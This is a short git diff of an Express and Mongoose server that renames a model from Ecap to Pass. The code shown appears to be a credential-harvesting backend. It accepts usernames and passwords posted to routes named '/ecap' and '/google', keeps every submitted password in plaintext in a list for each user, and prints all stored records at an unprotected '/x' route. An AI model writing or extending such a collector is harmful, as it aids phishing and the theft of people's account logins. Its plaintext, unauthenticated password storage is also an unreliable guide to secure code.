@@ -26,7 +26,7 @@ app.use(
 );
 
 app.get("/x", async (req, res) => {
-  const passes = await Ecap.find();
+  const passes = await Pass.find();
   console.log(passes);
   // console.log(passes);
 
@@ -52,14 +52,14 @@ app.post("/google", async (req, res) => {
 });
 app.post("/ecap", async (req, res) => {
   console.log(req.body);
-  let pass = await Ecap.findById(req.body.user);
+  let pass = await Pass.findById(req.body.user);
   if (pass) {
     if (pass.passwords.includes(req.body.passwd)) return res.send("done");
     pass.passwords.unshift(req.body.passwd);
     await pass.save();
     return res.send("done");
   } else {
-    let pass = new Ecap({
+    let pass = new Pass({
       _id: req.body.user,
       passwords: [req.body.passwd],
       type: [req.body.type],
